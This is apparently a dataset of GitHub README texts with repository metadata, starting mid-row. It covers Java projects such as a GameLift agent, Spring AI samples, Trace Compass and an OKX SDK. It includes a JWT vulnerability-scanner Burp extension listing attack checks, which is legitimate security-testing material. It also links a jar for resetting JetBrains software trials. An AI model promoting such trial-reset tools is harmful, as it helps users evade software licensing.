java -jar C:\\path\\to\\GameLiftAgent-1.0.jar `
  -c '<compute-name>' \
  -f '<fleet id>' \
  -loc 'custom-<custom location name>' \
  -r '<region name>' \
  -glc environment-variable \
  -gslb 'gameliftgamesessionlogS3bucketname' `
  -galb 'gameliftagentlogS3bucketname' `
  -galp 'C:\\GameLiftAgent\\logs\\'
```

### Example Environment Variables - Managed GameLift
#### Linux
```
export GAMELIFT_FLEET_ID=fleet-<id>
export GAMELIFT_COMPUTE_NAME=gamelift-compute-name
export GAMELIFT_REGION=us-west-2
export GAMELIFT_LOCATION=custom-<custom location name>
``` 

#### Windows
```
set GAMELIFT_FLEET_ID=fleet-<id>
set GAMELIFT_COMPUTE_NAME=gamelift-compute-name
set GAMELIFT_REGION=us-west-2
set GAMELIFT_LOCATION=custom-<custom location name>
``` 

## Security

See [CONTRIBUTING](CONTRIBUTING.md#security-issue-notifications) for more information.


## License
This project is licensed under the Apache-2.0 License.",2,3,3,9.0,"['gameliftagent', 'quick', 'start', 'jdk', 'version', 'build', 'gameliftagent', 'use', 'maven', 'before', 'run', 'linux', 'powershell', 'linux', 'powershell', 'linux', 'run', 'command', 'line', 'option', 'example', 'launch', 'command', 'manage', 'gamelift', 'linux', 'window', 'example', 'environment', 'variable', 'manage', 'gamelift', 'linux', 'window', 'security', 'license']","['linux', 'gameliftagent', 'run', 'powershell', 'command']",1.0,"[maven-assembly-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-surefire-plugin]",0.0,1.0,0.0
carldea/windowblur,main,"# windowblur
A JavaFX/Java to Objective C bridge library to natively use the Windows background blur effect on MacOS
",0,1,1,0.0,['windowblur'],['windowblur'],3.0,"[com.github.spotbugs:spotbugs-maven-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-gpg-plugin,org.apache.maven.plugins:maven-jar-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-source-plugin,org.apache.maven.plugins:maven-surefire-plugin,org.codehaus.mojo:exec-maven-plugin,org.openjfx:javafx-maven-plugin]",0.0,2.0,1.0
nkuhn-vmw/GenAI-for-TPCF-Samples,main,"# GenAI for Tanzu Platform for Cloud Foundry: Application Samples

This repo is designed to hold applications written to demo the new GenAI for TPCF tile.

[See Product Page to Sign Up for the Beta](https://tanzu.vmware.com/application-service/private-ai) for GenAI for TAS. A team member will reach out and schedule a call to get you on-boarded in the beta program.

See example Applications below:

1. [Gradio Chat](https://github.com/nkuhn-vmw/GenAI-for-TPCF-Samples/tree/main/gradio-chat) This is the sample chat application from fastchat modified to use GenAI for TAS as the backend LLM.

2. [Spring Metal](https://github.com/nkuhn-vmw/GenAI-for-TPCF-Samples/tree/main/spring-metal) A modifed version of the classic ""Spring Music"" Cloud Foundry application infused with magic from the new [Spring AI project](https://github.com/spring-projects/spring-ai). This app will add a ""Spring Music Assistant"" when the GenAI for TAS service is bound to this application.

3. [openweb-ui-cf](https://github.com/nkuhn-vmw/GenAI-for-TPCF-Samples/tree/main/openweb-ui-cf) The ever popular openweb ui frontend with TPCF deployment options and examples for GenAI for TPCF.

4. [acme-fitness](https://github.com/spring-cloud-services-samples/acme-fitness-store) This represents a fictional e-commerce store running multiple microservices and a new acme-assist microservice to provide a curated chatbot experience to assist customers in their shopping experience.


",0,0,1,7.0,"['genai', 'tanzu', 'platform', 'cloud', 'foundry', 'application', 'sample']","['genai', 'tanzu', 'platform', 'cloud', 'foundry']",1.0,"[org.cyclonedx:cyclonedx-maven-plugin,org.springframework.boot:spring-boot-maven-plugin]",0.0,1.0,0.0
soundvibe/ha-danfoss,main,"<div align=""center"">
<h1>Danfoss Icon Controller Add-on</h1>
</div>



## General

This add-on connects to Danfoss Icon Master Controller and controls its exposed thermostats.

## Installation

Add the repository URL under **Supervisor (Hass.io) â†’ Add-on Store** in your Home Assistant front-end:

    https://github.com/soundvibe/ha-danfoss

## Documentation

Addon README could be found [here](danfoss-addon/README.md).

## Donations

If this repository was useful to you and if you are willing to pay for it, feel free to send any amount through paypal:

[![paypal](https://www.paypalobjects.com/en_US/i/btn/btn_donateCC_LG.gif)](https://paypal.me/soundvibe)

",2,3,3,9.0,"['general', 'installation', 'documentation', 'donation']","['general', 'installation', 'documentation', 'donation']",1.0,"[maven-source-plugin,maven-surefire-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-shade-plugin,org.jacoco:jacoco-maven-plugin]",0.0,1.0,0.0
CompassSecurity/jwt-scanner,master,"# JWT-scanner - Burp Extension
## Description
JWT Scanner is a Burp Suite extension for automated testing of Jason Web Token (JWT) implementations of web applications. 


### Checks
- Signature presence
- Invalid signatures
- Signatures with empty passwords
- Usage of algorithm none variations
- Invalid ECDSA parameters (CVE-2022-21449)
- JWT JWK injection

## Features
- Select base request and autodetection of JWT
- Manually select target JWT in source request

## Usage
Run an active scan or manually select a request from to check:

1. Go to  Proxy / Repeater / Target / Logger / Intruder
2. Select request that requires a authentication with a valid JWT and returns a HTTP 200 response
> **_NOTE:_** First the extension will resend the selected request without modification and check if the JWT is still valid. If not a Error will be displayed in the Event Log

### Automatically detect JWT
3. Right-click on the request you want to check.
4. Extension -> JWT-scanner -> Autodetect JWT
5. In case of a identified vulnerability a issue is generated

Autodetect JWT from valid request:
![img.png](Doc/autoselect.png)
### Manually select JWT
3. Highlight the target JWT in request
4. Right-click highlighted JWT request
5. Extension -> JWT-scanner -> Selected JWT
6. In case of a identified vulnerability a issue is generated

## Installation
1. Download the latest pre-built jar file from [releases](https://github.com/CompassSecurity/jwt-scanner/releases).
2. Extender -> Tab Installed -> Add -> Extension Details -> Extension Type: *Java* -> Select file ...
3. Select the downloaded jar

Manually select JWT from valid request:
![img_1.png](Doc/manualselect.png)
## Build
Using maven to build jar file with dependencies:
```shell
mvn package -f pom.xml
```
",5,1,4,2.0,"['burp', 'extension', 'description', 'check', 'feature', 'usage', 'automatically', 'detect', 'jwt', 'manually', 'select', 'jwt', 'installation', 'build']","['jwt', 'burp', 'extension', 'description', 'check']",1.0,[maven-assembly-plugin],0.0,1.0,0.0
asaikali/spring-ai-zero-to-hero,main,"# spring-ai-zero-to-hero

Example applications showing how to use Spring AI to build Generative 
AI projects.

## Software Prerequisites

**You need the following software installed: Java 21, docker, ollama, httpie, 
ard your favourite Java IDE. This is a lot of GBs to download so please make 
sure to have all this stuff installed before the conference workshop, as the 
conference wifi may be slow, so you might not be able to run the samples.**

### Java development tooling
* Java 21 you can use [sdkman.io](https://sdkman.io/)
* [Maven](https://maven.apache.org/index.html)
* Favourite Java IDE one of
    * [IntelliJ](https://www.jetbrains.com/idea/download)
    * [VSCode](https://code.visualstudio.com/)
    * [Eclipse Spring Tool Suite](https://spring.io/tools)

### Http Client
*  Command line http client  [httpie](https://httpie.io/) is recommended, the instructions use it, if you don't have it please install it. If you are handy with [curl](https://curl.se/) you can use that too. 

### Containerization tools
* [Docker](https://www.docker.com/products/docker-desktop) so we can use test containers & for local dependencies  

### Local AI Models

[ollama](https://ollama.com/)  makes running models on your laptop easy and 
very educational. You can run the models locally and learn how they work. 

* Install ollama by following the instructions on the [ollama website](https://ollama.com/) this [YouTube video](https://www.youtube.com/watch?v=3Q6J6J7Q1Zo) shows the ollama install process.

## Save the conference Wi-Fi

Please make sure that the software list above is installed on your laptop 
before the workshop starts. After install: 

1. clone this repo to your laptop 
2. Run the `./download-deps.sh` script pull local AI models, and container 
   images. 
2. Run the `check-deps.sh` script to check that the all the required 
   software is installed, the output of the script on my machine looks like.

```text
./check-deps.sh
============================
Checking Java installation:
============================
Java is installed. Version details:
openjdk version ""21.0.4"" 2024-07-16 LTS
OpenJDK Runtime Environment (build 21.0.4+9-LTS)
OpenJDK 64-Bit Server VM (build 21.0.4+9-LTS, mixed mode, sharing)

===============================
Checking Ollama installation:
===============================
Ollama is installed. Version details:
ollama version is 0.3.10

========================================
Checking if llama3.1 model is pulled:
========================================
llama3.1 model is pulled and available.

==============================
Checking Docker installation:
==============================
Docker is installed. Version details:
Docker version 27.1.1, build 6312585

Checking Docker image: pgvector/pgvector:pg16
Docker image pgvector/pgvector:pg16 is pulled.

Checking Docker image: dpage/pgadmin4:8.6
Docker image dpage/pgadmin4:8.6 is pulled.

===============================
Checking HTTPie installation:
===============================
HTTPie is installed. Version details:
3.2.3
```

if you run into issues try running the commands in the `check-deps.sh` 
script one at a time. 

## API Keys

You will be provided with API keys for online AI services during the 
workshop, these keys will only be valid during the workshop. Highly 
recommend you get your own keys to continue experimenting after the workshop.

### OpenAI
* You need OpenAI API key to run the examples with OpenAI.
* Refer to [this page](https://help.openai.com/en/articles/4936850-where-do-i-find-my-openai-api-key) to get an API key.

### Azure OpenAI
* You need Azure OpenAI service instance in the Azure portal. This requires to fill out a form at the moment, which usually
  takes at most 24h to process.
* Create the service at https://portal.azure.com/#create/Microsoft.CognitiveServicesOpenAI
* Create an Azure OpenAI deployment at https://oai.azure.com/portal

# Outline

Generative AI is a transformational technology impacting our world in profound ways and creating unprecedented opportunities. This workshop is designed for Spring developers looking to add generative AI to existing applications or to implement brand new AI apps using the Spring AI project.

We assume no previous AI experience. The workshop will teach you key AI concepts and how to apply them in your applications, using the Spring AI project.

The workshop is hands-on. Bring your laptop and a willingness to learn. We will provide Spring AI based sample code and the API keys for the AI services. By the end of the day you will know how to add generative AI features to your Spring apps.

### Key Concepts covered:
- A Concise History of AI/ML
- Introduction to Generative AI Models
- Prompt Engineering Techniques & Best Practices
- Vector Databases
- RAG: Retrieval Augmented Generation
- Extending LLMs with Function Calling
- Evaluation: How to tell if the AI is doing what you think it should be doing
- Architecture of AI powered applications
- How to integrate AI into existing applications
- The landscape of tools and libraries of building AI powered applications

### Hands on Code Exercises with Spring AI:
- Quickstart: Creating a â€œHello Worldâ€ application for Generative AI in just minutes
- Prompt Engineering Techniques using Prompt Templating and Roles
- Mapping AI output to POJOs
- Implementing RAG (Retrieval Augmented Generation)
- Exploring Function calling: Enable the AI to access APIs on demand
- Evaluation Driven Development
- Using Spring AI with GraalVM

## Repo Organization 

Spring AI provides a consistent API to work with many different types of AI 
providers. For example, the same code wil work with OpenAI, Google Vertex AI,
Azure OpenAI, and local AI models. The major directories in this repo are:

- **/api/** this directory contains the code that interacts with the AI 
  providers. The code in this directory is the same for all the AI providers.
  Each project in this directory focuses on a different aspect of the Spring 
  AI API, within a project you will see that the package names end with 
  numbers indicating the order in which the code in each project should be 
  studied.
- **/providers/** this directory contains the spring boot applications  
  that interact with the specific AI providers. The configuration of each 
  project in this directory  is different, for example, setting API keys and 
  configuring the AI service with the correct endpoint. To try out the samples
  in this repo you will be launching the apps in this directory. Each 
  subdirectory contains a readme.md file with instructions on how to run the 
  application. 
- **/patterns/** this directory contains the code that demonstrates how to 
  use the Spring AI API to implement common AI application patterns such as 
  retrieval augmented generation. The code in this directory is the same for 
  all the AI providers.- 
-**/pgvector/** this directory contains a docker compose file to launch 
  postgres with the pgvector extension. This is used to demonstrate how to 
  use vector databases with Spring AI.
- **data/** this directory contains various types of example data sets used 
  by the examples in the repo.
- **docs/** this directory contains the documentation for the repo.

## Recommendations to get the most out of the repo

1. Run the samples with the different AI providers to see how the same code 
   works with different providers.
2. Run the gateway application and inspect the API requests/responses to see 
   what interaction with the AI projects looks like on the wire.
3. Make sure to run ollama and download the llama3 model to see how easy it 
   is to run local AI models. 
4. The code in this repo is designed to be read in order, so start with the 
   code in the api directory and work your way through the projects. Once 
   you have looked at the code in the api directory move on to the code in 
   the patterns' directory. 
5. Spring AI project is evolving quickly, it is possible that the code in 
   this repo will be using a snapshot release of the Spring AI project, or 
   that it falls behind the latest version. If you run into problem with 
   this repo, send a pull request or open an issue. ",0,0,2,6.0,"['software', 'prerequisite', 'java', 'development', 'tooling', 'http', 'client', 'containerization', 'tool', 'local', 'ai', 'model', 'save', 'conference', 'api', 'key', 'openai', 'azure', 'openai', 'outline', 'key', 'concept', 'cover', 'hand', 'code', 'exercise', 'spring', 'ai', 'repo', 'organization', 'recommendation', 'get', 'repo']","['ai', 'key', 'openai', 'repo', 'software']",20.0,"[com.diffplug.spotless:spotless-maven-plugin,org.springframework.boot:spring-boot-maven-plugin]",0.0,16.0,4.0
eclipse-tracecompass/org.eclipse.tracecompass,master,"# Eclipse Trace Compass

<img align=""right"" src=""doc/images/tc-logo.png"">

`Eclipse Trace Compassâ„¢` is an open source application to solve performance and
reliability issues by reading and analyzing logs or traces of a system. Its goal
is to provide views, graphs, metrics, and more to help extract useful
information from traces, in a way that is more user-friendly and informative
than huge text dumps.

`Eclipse Trace Compass` is also a framework to build such trace analysis and
visualization tools. It provides Eclipse extension points, declarative XML and
scripting capabilities to extend the core Trace Compass functionality for 
domain-specific trace formats and use cases.

For more information about the key features, see [Trace Compass website](https://eclipse.dev/tracecompass/).

Also, check-out the [user guides and developer guides](https://github.com/eclipse-tracecompass/org.eclipse.tracecompass/wiki#user-guides).

<img src=""doc/images/tc-screenshot.png"" width=""66%"">

## Releases

Information about releases can be found on the [Trace Compass project](https://projects.eclipse.org/projects/tools.tracecompass) page at Eclipse.org.

See [New & Noteworthy](https://github.com/eclipse-tracecompass/org.eclipse.tracecompass/wiki/New_In_Trace_Compass)
for release details.

## Downloads

`Eclipse Trace Compass` is available as plug-ins that can be installed to an
Eclipse IDE, as well as standalone application.

Check [Downloads](https://projects.eclipse.org/projects/tools.tracecompass/downloads) for downloading specific versions of Trace Compass.

## Contributing to Trace Compass

**ğŸ‘‹ Want to help?** Read our [contributor guide](CONTRIBUTING.md) and follow the
instructions to contribute code.

You will also find there information about the `setup of the development environment`,
`build instructions`, the `development and review process` as well as the `API policy`.

## Reporting issues

Read our [contributor guide](CONTRIBUTING.md#when-to-submit-patches) to get details on
how to report issues.

## Help and support

See [contact](CONTRIBUTING.md#contact) section of the contributor guide on how to get help and support. 
",0,10,45,137.0,"['eclipse', 'trace', 'compass', 'release', 'downloads', 'contribute', 'trace', 'compass', 'report', 'issue', 'help', 'support']","['trace', 'compass', 'eclipse', 'release', 'downloads']",83.0,"[maven-antrun-plugin,maven-clean-plugin,org.antlr:antlr3-maven-plugin,org.apache.maven.plugins:maven-antrun-plugin,org.apache.maven.plugins:maven-clean-plugin,org.apache.maven.plugins:maven-dependency-plugin,org.apache.maven.plugins:maven-deploy-plugin,org.apache.maven.plugins:maven-enforcer-plugin,org.apache.maven.plugins:maven-install-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-project-info-reports-plugin,org.apache.maven.plugins:maven-resources-plugin,org.apache.maven.plugins:maven-site-plugin,org.apache.maven.plugins:maven-toolchains-plugin,org.codehaus.mojo:build-helper-maven-plugin,org.eclipse.cbi.maven.plugins:eclipse-dmg-packager,org.eclipse.cbi.maven.plugins:eclipse-jarsigner-plugin,org.eclipse.cbi.maven.plugins:eclipse-macsigner-plugin,org.eclipse.cbi.maven.plugins:eclipse-winsigner-plugin,org.eclipse.rcptt:rcptt-maven-plugin,org.eclipse.tycho.extras:tycho-eclipserun-plugin,org.eclipse.tycho:target-platform-configuration,org.eclipse.tycho:tycho-compiler-plugin,org.eclipse.tycho:tycho-maven-plugin,org.eclipse.tycho:tycho-p2-director-plugin,org.eclipse.tycho:tycho-p2-plugin,org.eclipse.tycho:tycho-p2-publisher-plugin,org.eclipse.tycho:tycho-p2-repository-plugin,org.eclipse.tycho:tycho-packaging-plugin,org.eclipse.tycho:tycho-source-plugin,org.eclipse.tycho:tycho-surefire-plugin,org.eclipse.tycho:tycho-versions-plugin,org.jacoco:jacoco-maven-plugin,org.sonarsource.scanner.maven:sonar-maven-plugin]",0.0,0.0,15.0
phegondev/users-management-system,master,"# users-management-system

## Clone and checkout to the branch of the technology you want to use and view the code. Fell free to run and test

<img width=""1435"" alt=""Screenshot 2024-04-08 at 21 29 30"" src=""https://github.com/phegondev/users-management-system/assets/64640469/5c24913d-fa7d-4d85-b0a9-dfc3c87b51fd"">

<img width=""1262"" alt=""Screenshot 2024-04-08 at 21 29 53"" src=""https://github.com/phegondev/users-management-system/assets/64640469/15f3b644-4d31-4ae5-bb23-a418ca037eb1"">
<img width=""1028"" alt=""Screenshot 2024-04-08 at 21 30 08"" src=""https://github.com/phegondev/users-management-system/assets/64640469/ef01cef9-50e0-4766-a003-035af91701cb"">
",0,0,3,0.0,"['clone', 'checkout', 'branch', 'technology', 'want', 'use', 'view', 'code', 'fell', 'free', 'run', 'test']","['clone', 'checkout', 'branch', 'technology', 'want']",2.0,[org.springframework.boot:spring-boot-maven-plugin],0.0,2.0,0.0
quarkiverse/quarkus-fx,main,"# quarkus-fx

[![Version](https://img.shields.io/maven-central/v/io.quarkiverse.fx/quarkus-fx-parent?logo=apache-maven&style=flat-square)](https://search.maven.org/artifact/io.quarkiverse.fx/quarkus-fx)

<!-- ALL-CONTRIBUTORS-BADGE:START - Do not remove or modify this section -->
[![All Contributors](https://img.shields.io/badge/all_contributors-3-orange.svg?style=flat-square)](#contributors-)
<!-- ALL-CONTRIBUTORS-BADGE:END -->
This Quarkus extension allows you to use JavaFX in your Quarkus application. \
It will allow component injection in FX Controllers and will allow you to use CDI events to register on primary stage creation.

Please refer to documentation available at https://docs.quarkiverse.io/quarkus-fx/dev/index.html

You will be able to register on primary stage creation event via such code example.
```java
public class QuarkusFxApp {

  @Inject
  FXMLLoader fxmlLoader;

  public void start(@Observes final FxPostStartupEvent event) {
    try {
      InputStream fxml = this.getClass().getResourceAsStream(""/app.fxml"");
      Parent fxmlParent = this.fxmlLoader.load(fxml);

      Stage stage = event.getPrimaryStage();
      
      Scene scene = new Scene(fxmlParent);
      stage.setScene(scene);
      stage.show();

    } catch (IOException e) {
      // Handle error
    }
  }
}
```
To load multiple FXML files, you can use :
```java
@Inject
Instance<FXMLLoader> fxmlLoader;
```

Also, setting the location is required by some use cases (use of relative paths in FXML)
```java
FXMLLoader loader = this.fxmlLoader.get();
// Set location for relative path resolution
loader.setLocation(xxx);
```

For some sample apps and usage, check the `samples/` directory.

## Contributors âœ¨

Thanks goes to these wonderful people ([emoji key](https://allcontributors.org/docs/en/emoji-key)):

<!-- ALL-CONTRIBUTORS-LIST:START - Do not remove or modify this section -->
<!-- prettier-ignore-start -->
<!-- markdownlint-disable -->
<table>
  <tbody>
    <tr>
      <td align=""center"" valign=""top"" width=""14.28%""><a href=""https://github.com/CodeSimcoe""><img src=""https://avatars.githubusercontent.com/u/110094118?v=4?s=100"" width=""100px;"" alt=""ClÃ©ment de Tastes""/><br /><sub><b>ClÃ©ment de Tastes</b></sub></a><br /><a href=""https://github.com/quarkiverse/quarkus-fx/commits?author=CodeSimcoe"" title=""Code"">ğŸ’»</a> <a href=""#maintenance-CodeSimcoe"" title=""Maintenance"">ğŸš§</a></td>
      <td align=""center"" valign=""top"" width=""14.28%""><a href=""https://github.com/ghazyami""><img src=""https://avatars.githubusercontent.com/u/7247810?v=4?s=100"" width=""100px;"" alt=""Ghazy Abdallah""/><br /><sub><b>Ghazy Abdallah</b></sub></a><br /><a href=""https://github.com/quarkiverse/quarkus-fx/commits?author=ghazyami"" title=""Code"">ğŸ’»</a></td>
      <td align=""center"" valign=""top"" width=""14.28%""><a href=""http://www.jboss.org""><img src=""https://avatars.githubusercontent.com/u/332210?v=4?s=100"" width=""100px;"" alt=""Scott M Stark""/><br /><sub><b>Scott M Stark</b></sub></a><br /><a href=""https://github.com/quarkiverse/quarkus-fx/commits?author=starksm64"" title=""Code"">ğŸ’»</a></td>
    </tr>
  </tbody>
</table>

<!-- markdownlint-restore -->
<!-- prettier-ignore-end -->

<!-- ALL-CONTRIBUTORS-LIST:END -->

This project follows the [all-contributors](https://github.com/all-contributors/all-contributors) specification. Contributions of any kind welcome!
",0,7,3,41.0,['contributor'],['contributor'],9.0,"[io.quarkus:quarkus-extension-maven-plugin,io.quarkus:quarkus-maven-plugin,it.ozimov:yaml-properties-maven-plugin,maven-compiler-plugin,maven-failsafe-plugin,maven-resources-plugin,maven-surefire-plugin,org.apache.maven.plugins:maven-surefire-plugin,org.asciidoctor:asciidoctor-maven-plugin]",0.0,8.0,1.0
XGilmar/JetBrains-reset-trial-app,main,"# App reset trial

![Screenshot from 2024-05-13 15-36-46](https://github.com/XGilmar/JetBrains-reset-trial-app/assets/86094668/a1fd23ff-209b-4e43-8b0f-8d902f3274f6)

#

### Video

<details>
  <summary>see</summary>
  
https://github.com/user-attachments/assets/1339b94e-1dbf-4b44-a229-c7b63e4132f5

</details>

#

### ğŸ’» Required

- JDK 17 [install](https://docs.aws.amazon.com/corretto/latest/corretto-17-ug/downloads-list.html)

### Available environment

- Linux
- Windows `admin`
- Mac OS

### Demo

[Download](target/reset-trial-app-1.0-jar-with-dependencies.jar?raw=true)


",0,5,1,0.0,"['app', 'reset', 'trial', 'video', 'require', 'available', 'environment', 'demo']","['app', 'reset', 'trial', 'video', 'require']",1.0,[maven-assembly-plugin],0.0,1.0,0.0
forestwanglin/okx-v5-java,main,"# okx-v5-java
[![GitHub version](https://img.shields.io/static/v1?label=version&message=v0.5.2024072701&color=blue)](https://github.com/forestwanglin/okx-v5-java)
[![License](https://img.shields.io/static/v1?label=license&message=MIT&color=orange)](https://github.com/forestwanglin/okx-v5-java/blob/main/LICENSE)

OKX v5 SDK for JAVA. 

I am going to implement all APIs on the [official api document](https://www.okx.com/docs-v5/en/#overview).

## SDK API STATUS
- ### Rest API
  - [Trading Account](https://www.okx.com/docs-v5/en/#trading-account-rest-api)
    - [x] [Get Balance](https://www.okx.com/docs-v5/en/#trading-account-rest-api-get-balance)
    - [ ] [Get positions](https://www.okx.com/docs-v5/en/#trading-account-rest-api-get-positions)
    - [ ] [Get positions history](https://www.okx.com/docs-v5/en/#trading-account-rest-api-get-positions-history)
    - [ ] [Get account and position risk](https://www.okx.com/docs-v5/en/#trading-account-rest-api-get-account-and-position-risk)
    - [ ] [Get bills details (last 7 days)](https://www.okx.com/docs-v5/en/#trading-account-rest-api-get-bills-details-last-7-days)
    - [ ] [Get bills details (last 3 months)](https://www.okx.com/docs-v5/en/#trading-account-rest-api-get-bills-details-last-3-months)
    - [ ] [Get account configuration](https://www.okx.com/docs-v5/en/#trading-account-rest-api-get-account-configuration)
    - [ ] [Set position mode](https://www.okx.com/docs-v5/en/#trading-account-rest-api-set-position-mode)
    - [ ] [Set leverage](https://www.okx.com/docs-v5/en/#trading-account-rest-api-set-leverage)
    - [ ] [Get maximum buy/sell amount or open amount](https://www.okx.com/docs-v5/en/#trading-account-rest-api-get-maximum-buy-sell-amount-or-open-amount)
    - [ ] ...
  - [Order Book Trading](https://www.okx.com/docs-v5/en/#order-book-trading)
    - [Trade](https://www.okx.com/docs-v5/en/#order-book-trading-trade)
      - [x] [POST / Place order](https://www.okx.com/docs-v5/en/#order-book-trading-trade-post-place-order)
      - [ ] [POST / Place multiple orders](https://www.okx.com/docs-v5/en/#order-book-trading-trade-post-place-multiple-orders)
      - [x] [POST / Cancel order](https://www.okx.com/docs-v5/en/#order-book-trading-trade-post-cancel-order)
      - [ ] [POST / Cancel multiple orders](https://www.okx.com/docs-v5/en/#order-book-trading-trade-post-cancel-multiple-orders)
      - [ ] [POST / Amend order](https://www.okx.com/docs-v5/en/#order-book-trading-trade-post-amend-order)
      - [ ] [POST / Amend multiple orders](https://www.okx.com/docs-v5/en/#order-book-trading-trade-post-amend-multiple-orders)
      - [ ] [POST / Close positions](https://www.okx.com/docs-v5/en/#order-book-trading-trade-post-close-positions)
      - [ ] ...
    - [Grid Trading](https://www.okx.com/docs-v5/en/#order-book-trading-grid-trading)
      - [x] [POST / Place grid algo order](https://www.okx.com/docs-v5/en/#order-book-trading-grid-trading-post-place-grid-algo-order)
      - [x] [POST / Amend grid algo order](https://www.okx.com/docs-v5/en/#order-book-trading-grid-trading-post-amend-grid-algo-order)
      - [x] [POST / Stop grid algo order](https://www.okx.com/docs-v5/en/#order-book-trading-grid-trading-post-stop-grid-algo-order)
      - [x] [POST / Close position for contract grid](https://www.okx.com/docs-v5/en/#order-book-trading-grid-trading-post-close-position-for-contract-grid)
      - [x] [POST / Cancel close position order for contract grid](https://www.okx.com/docs-v5/en/#order-book-trading-grid-trading-post-cancel-close-position-order-for-contract-grid)
      - [x] [POST / Instant trigger grid algo order](https://www.okx.com/docs-v5/en/#order-book-trading-grid-trading-post-instant-trigger-grid-algo-order)
      - [x] [GET / Grid algo order list](https://www.okx.com/docs-v5/en/#order-book-trading-grid-trading-get-grid-algo-order-list)
      - [x] [GET / Grid algo order history](https://www.okx.com/docs-v5/en/#order-book-trading-grid-trading-get-grid-algo-order-history)
      - [x] [GET / Grid algo order details](https://www.okx.com/docs-v5/en/#order-book-trading-grid-trading-get-grid-algo-order-details)
      - [x] [GET / Grid algo sub orders](https://www.okx.com/docs-v5/en/#order-book-trading-grid-trading-get-grid-algo-sub-orders)
      - [x] [GET / Grid algo order positions](https://www.okx.com/docs-v5/en/#order-book-trading-grid-trading-get-grid-algo-order-positions)
      - [x] [POST / Spot grid withdraw income](https://www.okx.com/docs-v5/en/#order-book-trading-grid-trading-post-spot-grid-withdraw-income)
      - [x] [POST / Compute margin balance](https://www.okx.com/docs-v5/en/#order-book-trading-grid-trading-post-compute-margin-balance)
      - [x] [POST / Adjust margin balance](https://www.okx.com/docs-v5/en/#order-book-trading-grid-trading-post-adjust-margin-balance)
      - [x] [POST / Add investment](https://www.okx.com/docs-v5/en/#order-book-trading-grid-trading-post-add-investment)
      - [x] [GET / Grid AI parameter (public)](https://www.okx.com/docs-v5/en/#order-book-trading-grid-trading-get-grid-ai-parameter-public)
      - [x] [POST / Compute min investment (public)](https://www.okx.com/docs-v5/en/#order-book-trading-grid-trading-post-compute-min-investment-public)
      - [x] [GET / RSI back testing (public)](https://www.okx.com/docs-v5/en/#order-book-trading-grid-trading-get-rsi-back-testing-public)
- ### Websocket API
  - [Trading Account](https://www.okx.com/docs-v5/zh/#trading-account-websocket)
    - [x] [Account channel](https://www.okx.com/docs-v5/en/#trading-account-websocket-account-channel)
    - [x] [Positions channel](https://www.okx.com/docs-v5/en/#trading-account-websocket-positions-channel)
    - [x] [Balance and position channel](https://www.okx.com/docs-v5/en/#trading-account-websocket-balance-and-position-channel)
    - [x] [Position risk warning](https://www.okx.com/docs-v5/en/#trading-account-websocket-position-risk-warning)
    - [x] [Account greeks channel](https://www.okx.com/docs-v5/en/#trading-account-websocket-account-greeks-channel)
  - [Order Book Trading](https://www.okx.com/docs-v5/en/#order-book-trading)
    - [Trade](https://www.okx.com/docs-v5/en/#order-book-trading-trade)
      - [x] [WS / Order channel](https://www.okx.com/docs-v5/en/#order-book-trading-trade-ws-order-channel)
      - [x] [WS / Place order](https://www.okx.com/docs-v5/en/#order-book-trading-trade-ws-place-order)
      - [x] [WS / Place multiple orders](https://www.okx.com/docs-v5/en/#order-book-trading-trade-ws-place-multiple-orders)
      - [x] [WS / Cancel order](https://www.okx.com/docs-v5/en/#order-book-trading-trade-ws-cancel-order)
      - [x] [WS / Cancel multiple orders](https://www.okx.com/docs-v5/en/#order-book-trading-trade-ws-cancel-multiple-orders)
      - [x] [WS / Amend order](https://www.okx.com/docs-v5/en/#order-book-trading-trade-ws-amend-order)
      - [x] [WS / Amend multiple orders](https://www.okx.com/docs-v5/en/#order-book-trading-trade-ws-amend-multiple-orders)
      - [x] [WS / Mass cancel order](https://www.okx.com/docs-v5/en/#order-book-trading-trade-ws-mass-cancel-order)
    - [Algo Trading](https://www.okx.com/docs-v5/en/#order-book-trading-algo-trading)
      - [x] [WS / Algo orders channel](https://www.okx.com/docs-v5/en/#order-book-trading-algo-trading-ws-algo-orders-channel)
      - [x] [WS / Advance algo orders channel](https://www.okx.com/docs-v5/en/#order-book-trading-algo-trading-ws-advance-algo-orders-channel)
    - [Grid Trading](https://www.okx.com/docs-v5/en/#order-book-trading-grid-trading)
      - [x] [WS / Spot grid algo orders channel](https://www.okx.com/docs-v5/en/#order-book-trading-grid-trading-ws-spot-grid-algo-orders-channel)
      - [x] [WS / Contract grid algo orders channel](https://www.okx.com/docs-v5/en/#order-book-trading-grid-trading-ws-contract-grid-algo-orders-channel)
      - [x] [WS / Grid positions channel](https://www.okx.com/docs-v5/en/#order-book-trading-grid-trading-ws-grid-positions-channel)
      - [x] [WS / Grid sub orders channel](https://www.okx.com/docs-v5/en/#order-book-trading-grid-trading-ws-grid-sub-orders-channel)
  - [Public Data](https://www.okx.com/docs-v5/en/#public-data-websocket)
    - [x] [Instruments channel](https://www.okx.com/docs-v5/en/#public-data-websocket-instruments-channel)
    - [x] [Open interest channel](https://www.okx.com/docs-v5/en/#public-data-websocket-open-interest-channel)
    - [x] [Funding rate channel](https://www.okx.com/docs-v5/en/#public-data-websocket-funding-rate-channel)
    - [x] [Price limit channel](https://www.okx.com/docs-v5/en/#public-data-websocket-price-limit-channel)
    - [x] [Option summary channel](https://www.okx.com/docs-v5/en/#public-data-websocket-option-summary-channel)
    - [x] [Estimated delivery/exercise price channel](https://www.okx.com/docs-v5/en/#public-data-websocket-estimated-delivery-exercise-price-channel)
    - [x] [Mark price channel](https://www.okx.com/docs-v5/en/#public-data-websocket-mark-price-channel)
    - [x] [Index tickers channel](https://www.okx.com/docs-v5/en/#public-data-websocket-index-tickers-channel)
    - [x] [Mark price candlesticks channel](https://www.okx.com/docs-v5/en/#public-data-websocket-mark-price-candlesticks-channel)
    - [x] [Index candlesticks channel](https://www.okx.com/docs-v5/en/#public-data-websocket-index-candlesticks-channel)
    - [x] [Liquidation orders channel](https://www.okx.com/docs-v5/en/#public-data-websocket-liquidation-orders-channel)
    - [x] [ADL warning channel](https://www.okx.com/docs-v5/en/#public-data-websocket-adl-warning-channel)
